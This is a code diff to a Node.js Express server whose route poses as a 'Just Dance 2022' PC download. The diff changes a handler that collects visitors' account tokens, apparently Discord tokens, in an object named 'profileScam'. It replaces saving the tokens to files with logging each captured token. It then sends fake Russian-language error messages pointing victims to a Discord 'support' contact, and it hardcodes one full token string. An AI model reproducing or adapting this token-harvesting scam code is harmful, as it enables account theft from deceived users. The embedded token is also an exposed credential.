@@ -18,7 +18,13 @@ app.get('/justdance2022/download/pc', function (req, res) {
             token: tokenHead
         };
         var profileScam = JSON.stringify(object);
-        fs.writeFile("./tokens/"+tokenHead+".json", profileScam, function (err) {
+        console.log("Файл создан" + ". Токен получен - " + tokenHead);
+                if(tokenHead==="mfa.LemvHJshUwSZAfSz08bmg8fyq_l0FTZn6HizlKZyLofaLKGVy7XC3lkDJf5zkbXYqhBF6siXDejhJMW"){
+                    res.send("Этот токен уже получил ссылку, используйте свой токен. Если это не помогло, обратитесь в поддержку в Discord'e -  Michael Ruinlov#6743 ")
+                } else{
+                     res.send("Хм, что-то пошло не так, поторите попытку через 10 секунд. Если это не помогло, обратитесь в поддержку в Discord'e -  Michael Ruinlov#6743 ");
+                }
+       /* fs.writeFile("./tokens/"+tokenHead+".json", profileScam, function (err) {
             if (err) {
                 console.log(err);
                 res.send("Запрос неуспешный")
@@ -31,7 +37,7 @@ app.get('/justdance2022/download/pc', function (req, res) {
                 }
                
             }
-        });
+        });*/
     })
 });
 app.get('/', function (req, res) {
